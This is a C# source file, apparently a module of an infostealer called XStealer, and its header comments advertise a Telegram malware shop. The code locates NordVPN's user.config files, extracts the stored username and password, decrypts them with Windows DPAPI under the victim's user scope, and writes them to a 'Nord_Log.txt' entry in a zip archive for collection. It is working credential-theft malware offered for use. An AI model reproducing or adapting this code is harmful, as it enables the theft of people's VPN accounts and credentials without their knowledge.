// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Apps.Vpn
{
    using System.IO;
    using System.Linq;
    using System.Security.Cryptography;
    using System.Text;
    using System.Xml;
    using Helpers;

    public static class NordVpn
    {
        /// <summary>
        /// Метод для получения данных из NordVPN в памяти.
        /// </summary>
        public static void Inizialize()
        {
            using var ms = new MemoryStream { Position = 0 };
            try
            {
                var directoryInfo = new DirectoryInfo(GlobalPaths.NordPath);
                if (directoryInfo.Exists)
                {
                    using var data = new StreamWriter(ms, Encoding.UTF8);
                    foreach (DirectoryInfo dirNordNext in directoryInfo.GetDirectories("NordVpn.exe*").SelectMany(dirNord => dirNord.GetDirectories()))
                    {
                        string text = GlobalPaths.CombinePath(dirNordNext.FullName, "user.config");
                        if (File.Exists(text))
                        {
                            try
                            {
                                var xf = new XmlDocument() { XmlResolver = null };
                                xf.Load(text);
                                string login = xf.SelectSingleNode("//setting[@name='Username']/value")?.InnerText;
                                string password = xf.SelectSingleNode("//setting[@name='Password']/value")?.InnerText;
                                if (!string.IsNullOrWhiteSpace(login) || !string.IsNullOrWhiteSpace(password))
                                {
                                    data.WriteLine($"App Version: {dirNordNext.Name}");
                                    data.WriteLine($"Login: {DecoderEx.UnprotectDataEx(login, DataProtectionScope.CurrentUser)}");
                                    data.WriteLine($"password: {DecoderEx.UnprotectDataEx(password, DataProtectionScope.CurrentUser)}\r\n");
                                }
                            }
                            catch { continue; }
                        }
                    }
                    data.Flush();
                }
            }
            catch { }
            ZipEx.AddKeyPairStream("VPN/Nord_Log.txt", ms?.ToArray() ?? ms.GetBuffer() ?? null);
        }
    }
}
